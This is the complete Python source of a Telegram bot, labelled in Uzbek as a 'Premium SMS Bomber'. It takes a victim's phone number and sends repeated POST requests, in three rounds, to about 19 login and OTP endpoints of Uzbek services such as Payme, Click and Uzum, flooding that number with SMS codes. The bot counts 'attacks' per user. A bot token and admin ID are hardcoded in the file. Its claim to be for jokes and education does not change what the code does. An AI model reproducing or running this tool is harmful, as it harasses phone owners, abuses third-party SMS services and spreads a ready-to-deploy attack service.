import asyncio
import logging
import sqlite3
import os
import re
from datetime import datetime
import aiohttp
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton
)
from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder

# ==================== KONFIGURATSIYA (Builder o'zgartiradi) ====================
BOT_TOKEN = "8734482130:AAGg_kg2l2qct3wvgMYm-YaR86vCFcSdt4M"  
ADMIN_ID_STR = "8426582765"

try:
    ADMIN_ID = int(ADMIN_ID_STR)
except:
    ADMIN_ID = 0

ADMIN_IDS = [ADMIN_ID]             

# Izolyatsiya qilingan baza
BOT_PREFIX = BOT_TOKEN.split(':')[0] if ':' in BOT_TOKEN else "unknown"
DB_FILE = f"db_sms_bomber_{BOT_PREFIX}.sqlite"

# ==================== LOGGING ====================
logging.basicConfig(level=logging.INFO)

# ==================== BOT VA DISPATCHER ====================
bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# ==================== MA'LUMOTLAR BAZASI ====================
def init_db():
    conn = sqlite3.connect(DB_FILE)
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            joined_date TEXT,
            is_admin INTEGER DEFAULT 0,
            is_blocked INTEGER DEFAULT 0,
            attacks_count INTEGER DEFAULT 0
        )
    """)
    cur.execute("""
        CREATE TABLE IF NOT EXISTS broadcasts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            admin_id INTEGER,
            message_text TEXT,
            sent_count INTEGER,
            failed_count INTEGER,
            created_at TEXT
        )
    """)
    conn.commit()
    conn.close()

# ==================== YORDAMCHI FUNKSIYALAR ====================
def add_user(user_id, username, first_name, last_name):
    conn = sqlite3.connect(DB_FILE)
    cur = conn.cursor()
    now = datetime.now().isoformat()
    cur.execute("""
        INSERT OR IGNORE INTO users (user_id, username, first_name, last_name, joined_date)
        VALUES (?, ?, ?, ?, ?)
    """, (user_id, username, first_name, last_name, now))
    conn.commit()
    conn.close()

def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_blocked(user_id):
    conn = sqlite3.connect(DB_FILE)
    cur = conn.cursor()
    cur.execute("SELECT is_blocked FROM users WHERE user_id=?", (user_id,))
    row = cur.fetchone()
    conn.close()
    return row and row[0] == 1

def block_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    cur = conn.cursor()
    cur.execute("UPDATE users SET is_blocked=1 WHERE user_id=?", (user_id,))
    conn.commit()
    conn.close()

def unblock_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    cur = conn.cursor()
    cur.execute("UPDATE users SET is_blocked=0 WHERE user_id=?", (user_id,))
    conn.commit()
    conn.close()

def get_all_users(only_active=True):
    conn = sqlite3.connect(DB_FILE)
    cur = conn.cursor()
    if only_active:
        cur.execute("SELECT user_id, username, first_name FROM users WHERE is_blocked=0")
    else:
        cur.execute("SELECT user_id, username, first_name FROM users")
    users = cur.fetchall()
    conn.close()
    return users

def get_stats():
    conn = sqlite3.connect(DB_FILE)
    cur = conn.cursor()
    cur.execute("SELECT COUNT(*) FROM users")
    total_users = cur.fetchone()[0]
    cur.execute("SELECT COUNT(*) FROM users WHERE is_blocked=1")
    blocked_users = cur.fetchone()[0]
    cur.execute("SELECT SUM(attacks_count) FROM users")
    total_attacks = cur.fetchone()[0] or 0
    conn.close()
    return {
        "total_users": total_users,
        "blocked_users": blocked_users,
        "total_attacks": total_attacks
    }

def increment_attacks(user_id):
    conn = sqlite3.connect(DB_FILE)
    cur = conn.cursor()
    cur.execute("UPDATE users SET attacks_count = attacks_count + 1 WHERE user_id=?", (user_id,))
    conn.commit()
    conn.close()

def add_broadcast(admin_id, text, sent, failed):
    conn = sqlite3.connect(DB_FILE)
    cur = conn.cursor()
    now = datetime.now().isoformat()
    cur.execute("""
        INSERT INTO broadcasts (admin_id, message_text, sent_count, failed_count, created_at)
        VALUES (?, ?, ?, ?, ?)
    """, (admin_id, text, sent, failed, now))
    conn.commit()
    conn.close()

# ==================== HOLATLAR (FSM) ====================
class BomberStates(StatesGroup):
    waiting_phone = State()
    
    waiting_broadcast = State()
    confirm_broadcast = State()
    waiting_block_id = State()
    waiting_unblock_id = State()

# ==================== KLAVIATURALAR ====================
def main_menu_keyboard(is_admin_user=False):
    builder = ReplyKeyboardBuilder()
    builder.add(KeyboardButton(text="💣 Hujum boshlash"))
    builder.add(KeyboardButton(text="ℹ️ Yordam"))
    if is_admin_user:
        builder.add(KeyboardButton(text="👨‍💼 Admin panel"))
    builder.adjust(2, 1)
    return builder.as_markup(resize_keyboard=True)

def admin_panel_keyboard():
    builder = InlineKeyboardBuilder()
    builder.button(text="📊 Statistika", callback_data="admin_stats")
    builder.button(text="👥 Foydalanuvchilar", callback_data="admin_users")
    builder.button(text="🔇 Bloklash", callback_data="admin_block_user")
    builder.button(text="🔊 Blokdan chiqarish", callback_data="admin_unblock_user")
    builder.button(text="📢 Reklama yuborish", callback_data="admin_broadcast")
    builder.adjust(2)
    return builder.as_markup()

def cancel_inline():
    builder = InlineKeyboardBuilder()
    builder.button(text="❌ Bekor qilish", callback_data="cancel_action")
    return builder.as_markup()

def back_to_admin():
    builder = InlineKeyboardBuilder()
    builder.button(text="⬅️ Orqaga", callback_data="back_to_admin")
    return builder.as_markup()

# ==================== API FUNKSIYALAR ====================
async def run_sms_bomber(phone, rounds=3):
    """Barcha APILarga ketma-ket SMS so'rovlarini yuboradi (Asinxron)"""
    p998 = phone
    p_plus = f"+{phone}"
    
    targets = [
        {'name': 'Payme', 'url': 'https://api.payme.uz/api/auth/send-code', 'json': {'phone': p998}},
        {'name': 'Click', 'url': 'https://click.uz/api/auth/request-code', 'json': {'phone': p998}},
        {'name': 'Alif', 'url': 'https://gw.alifshop.uz/web/client/auth/request-login', 'json': {'phone': p998}},
        {'name': 'Uzum', 'url': 'https://api.uzum.uz/api/v1/auth/send-code', 'json': {'phone': p998}},
        {'name': 'Olcha', 'url': 'https://api.olcha.uz/v1/auth/send-verify-code', 'json': {'phone': p998}},
        {'name': 'Asaxiy', 'url': 'https://asaxiy.uz/api/auth/send-sms', 'json': {'phone': p998}},
        {'name': 'Texnomart', 'url': 'https://texnomart.uz/api/auth/send-code', 'json': {'phone': p998}},
        {'name': 'Express24', 'url': 'https://api.express24.uz/v1/auth/otp', 'json': {'phone': p998}},
        {'name': 'Oqtepa', 'url': 'https://oqtepalavash.uz/api/sms/Send', 'json': {'phone': p998}},
        {'name': 'Makro', 'url': 'https://makro.uz/api/auth/code', 'json': {'phone': p998}},
        {'name': 'Evos', 'url': 'https://evos.uz/api/auth/code', 'json': {'phone': p998}},
        {'name': '100k.uz', 'url': 'https://api.100k.uz/api/auth/sms-login', 'json': {'phone': p_plus, 'source': 'android'}},
        {'name': 'Uybor', 'url': 'https://api.uybor.uz/api/v1/auth/code', 'json': {'phone': p_plus}},
        {'name': 'Dafna', 'url': 'https://dafna.uz/api/send-code', 'json': {'phone': p998}},
        {'name': 'Openshop', 'url': 'https://web.openshop.uz/api/v1/auth/login-phone', 'json': {'phone': p998}},
        {'name': 'Soff', 'url': 'https://api.soff.uz/auth/register/', 'json': {'phone_or_email': p_plus, 'role': 'customer'}},
        {'name': 'Zood', 'url': 'https://api.zoodmall.uz/v1/auth/login-otp', 'json': {'phone': p998}},
        {'name': 'Multibank', 'url': 'https://auth.multibank.uz/api/otp-by-phone', 'json': {'phone': p998}},
        {'name': 'Yandex', 'url': 'https://api.yandex.uz/auth/sms', 'json': {'phone': p_plus}}
    ]

    success = 0
    failed = 0
    total = len(targets) * rounds

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json',
        'Content-Type': 'application/json'
    }

    async with aiohttp.ClientSession(headers=headers) as session:
        for _ in range(rounds):
            for target in targets:
                try:
                    async with session.post(target['url'], json=target.get('json'), timeout=6) as resp:
                        if resp.status in [200, 201, 202, 204, 400, 422, 429]:
                            success += 1
                        else:
                            failed += 1
                except:
                    failed += 1
                await asyncio.sleep(0.1) # Qotib qolmasligi uchun kichik pauza
    
    return success, failed, total

# ==================== HANDLERLAR ====================
@dp.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    user = message.from_user
    add_user(user.id, user.username, user.first_name, user.last_name)
    admin = is_admin(user.id)
    
    if is_blocked(user.id):
        await message.answer("🚫 Siz bloklangansiz. Admin bilan bog'laning.")
        return
    
    await message.answer(
        f"Assalomu alaykum, <b>{user.first_name}</b>! 👋\n\n"
        f"💣 Men <b>Premium SMS Bomber</b> botiman. O'zbekistonning eng yirik 20+ servislaridan SMS xabarlarini to'xtovsiz yubora olaman.\n\n"
        f"Kerakli bo'limni tanlang 👇\n\n"
        f"⚙️ <b>Yaratuvchi:</b> @vsf911",
        parse_mode="HTML",
        reply_markup=main_menu_keyboard(admin)
    )

@dp.message(F.text == "ℹ️ Yordam")
async def help_cmd(message: Message, state: FSMContext):
    await state.clear()
    await message.answer(
        "🤖 <b>Bot imkoniyatlari:</b>\n\n"
        "💣 <b>Hujum boshlash:</b> Kiritilgan raqamga O'zbekistondagi eng mashhur ilovalar (Payme, Uzum, Yandex, Click va boshqalar) orqali ketma-ket avtorizatsiya SMS'larini yuboradi.\n\n"
        "<i>⚠️ Eslatma: Ushbu bot faqat xazil va ta'lim maqsadida ishlab chiqilgan. Noto'g'ri maqsadlarda foydalanish tavsiya etilmaydi!</i>\n\n"
        "⚙️ <b>Yaratuvchi:</b> @vsf911",
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "cancel_action")
async def cancel_action_callback(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_text("❌ Amaliyot bekor qilindi.")
    await callback.answer()

# ----------------- BOMBER PROCESS -----------------
@dp.message(F.text == "💣 Hujum boshlash")
async def bomber_start(message: Message, state: FSMContext):
    if is_blocked(message.from_user.id): return
    await message.answer(
        "💣 <b>SMS Bomber | Yangi Hujum</b>\n\n"
        "Qaysi raqamga SMS yubormoqchisiz?\n"
        "Raqamni 9 xonali (masalan: <i>901234567</i>) yoki 12 xonali (masalan: <i>998901234567</i>) formatda kiriting:",
        parse_mode="HTML", reply_markup=cancel_inline()
    )
    await state.set_state(BomberStates.waiting_phone)

@dp.message(BomberStates.waiting_phone)
async def bomber_process(message: Message, state: FSMContext):
    phone_raw = re.sub(r'\D', '', message.text.strip())
    
    if len(phone_raw) == 9:
        phone = "998" + phone_raw
    elif len(phone_raw) == 12 and phone_raw.startswith("998"):
        phone = phone_raw
    else:
        await message.answer("❌ Noto'g'ri format! Faqat 9 yoki 12 xonali o'zbek raqamini kiriting.", reply_markup=cancel_inline())
        return
    
    msg = await message.answer(f"🚀 <b>+{phone}</b> raqamiga hujum boshlandi!\n\n<i>Jarayon davom etmoqda, iltimos kuting...</i>", parse_mode="HTML")
    await state.clear()
    
    # Asinxron tarzda SMS yuborishni kutamiz (qotib qolmaydi)
    success, failed, total = await run_sms_bomber(phone, rounds=3) # 3 ta aylana uradi
    
    caption = (
        f"✅ <b>Hujum yakunlandi!</b>\n\n"
        f"📱 <b>Nishon:</b> +{phone}\n"
        f"🟢 <b>Yuborilgan SMS:</b> {success} ta\n"
        f"🔴 <b>Xatoliklar:</b> {failed} ta\n\n"
        f"⚙️ <b>Yaratuvchi:</b> @vsf911"
    )
    
    await msg.edit_text(caption, parse_mode="HTML")
    increment_attacks(message.from_user.id)

# ----------------- ADMIN PANEL HANDLERLARI -----------------
@dp.message(F.text == "👨‍💼 Admin panel")
async def admin_panel(message: Message):
    if not is_admin(message.from_user.id): return
    await message.answer("👨‍💼 <b>Admin panel</b>\n\n⚙️ Yaratuvchi: @vsf911", parse_mode="HTML", reply_markup=admin_panel_keyboard())

@dp.callback_query(F.data == "admin_stats")
async def admin_stats(callback: CallbackQuery):
    if not is_admin(callback.from_user.id): return
    stats = get_stats()
    text = (
        f"📊 <b>Statistika</b>\n\n"
        f"👥 Jami foydalanuvchilar: {stats['total_users']}\n"
        f"🔇 Bloklanganlar: {stats['blocked_users']}\n"
        f"💣 Amalga oshirilgan hujumlar: {stats['total_attacks']}\n\n"
        f"⚙️ <b>Yaratuvchi:</b> @vsf911"
    )
    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=back_to_admin())

@dp.callback_query(F.data == "admin_users")
async def admin_users(callback: CallbackQuery):
    if not is_admin(callback.from_user.id): return
    users = get_all_users(only_active=False)
    if not users:
        await callback.message.edit_text("Foydalanuvchilar yo'q.", reply_markup=back_to_admin())
        return
    text = "👥 <b>Foydalanuvchilar ro'yxati:</b>\n\n"
    for uid, username, name in users[:20]:
        uname = f"@{username}" if username else "yo'q"
        text += f"• {name} ({uname}) - <code>{uid}</code>\n"
    if len(users) > 20:
        text += f"\n...va yana {len(users)-20} ta"
    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=back_to_admin())

@dp.callback_query(F.data == "admin_block_user")
async def admin_block_prompt(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id): return
    await callback.message.edit_text("Bloklash uchun foydalanuvchi Telegram ID sini yuboring:", reply_markup=back_to_admin())
    await state.set_state(BomberStates.waiting_block_id)

@dp.message(BomberStates.waiting_block_id)
async def process_admin_block_user(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id): return
    try:
        user_id = int(message.text.strip())
        block_user(user_id)
        await message.answer(f"✅ Foydalanuvchi {user_id} bloklandi.", reply_markup=main_menu_keyboard(True))
    except:
        await message.answer("❌ Noto'g'ri ID.", reply_markup=main_menu_keyboard(True))
    await state.clear()

@dp.callback_query(F.data == "admin_unblock_user")
async def admin_unblock_prompt(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id): return
    await callback.message.edit_text("Blokdan chiqarish uchun foydalanuvchi Telegram ID sini yuboring:", reply_markup=back_to_admin())
    await state.set_state(BomberStates.waiting_unblock_id)

@dp.message(BomberStates.waiting_unblock_id)
async def process_admin_unblock_user(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id): return
    try:
        user_id = int(message.text.strip())
        unblock_user(user_id)
        await message.answer(f"✅ Foydalanuvchi {user_id} blokdan chiqarildi.", reply_markup=main_menu_keyboard(True))
    except:
        await message.answer("❌ Noto'g'ri ID.", reply_markup=main_menu_keyboard(True))
    await state.clear()

@dp.callback_query(F.data == "admin_broadcast")
async def admin_broadcast_start(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id): return
    await callback.message.edit_text("📢 Yubormoqchi bo'lgan xabaringizni yozing (Rasm/Video ham yuborishingiz mumkin):", reply_markup=back_to_admin())
    await state.set_state(BomberStates.waiting_broadcast)

@dp.message(BomberStates.waiting_broadcast)
async def admin_broadcast_preview(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id): return
    
    await state.update_data(bcast_msg_id=message.message_id, bcast_chat_id=message.chat.id)
    
    keyboard = InlineKeyboardBuilder()
    keyboard.button(text="✅ Ha, yuborish", callback_data="broadcast_confirm")
    keyboard.button(text="❌ Yo'q", callback_data="cancel_action")
    
    await message.copy_to(message.chat.id, reply_markup=keyboard.as_markup())
    await message.answer("Yuborishni tasdiqlaysizmi?")
    await state.set_state(BomberStates.confirm_broadcast)

@dp.callback_query(F.data == "broadcast_confirm")
async def admin_broadcast_send(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id): return
    
    data = await state.get_data()
    msg_id = data.get("bcast_msg_id")
    chat_id = data.get("bcast_chat_id")
    
    await callback.message.edit_text("📨 Xabar yuborilmoqda... Bu biroz vaqt olishi mumkin.")
    users = get_all_users(only_active=True)
    sent = failed = 0
    
    for uid, _, _ in users:
        try:
            await bot.copy_message(chat_id=uid, from_chat_id=chat_id, message_id=msg_id)
            sent += 1
            await asyncio.sleep(0.05) 
        except:
            failed += 1
            
    add_broadcast(callback.from_user.id, "Copied Message", sent, failed)
    await callback.message.edit_text(f"✅ Yuborildi: {sent}, Xatolik: {failed}", reply_markup=back_to_admin())
    await state.clear()

@dp.callback_query(F.data == "back_to_admin")
async def back_to_admin_handler(callback: CallbackQuery):
    await callback.message.edit_text("👨‍💼 <b>Admin panel</b>\n\n⚙️ Yaratuvchi: @vsf911", parse_mode="HTML", reply_markup=admin_panel_keyboard())

# ==================== BOTNI ISHGA TUSHIRISH ====================
async def main():
    init_db()
    logging.info("SMS Bomber Bot ishga tushmoqda...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
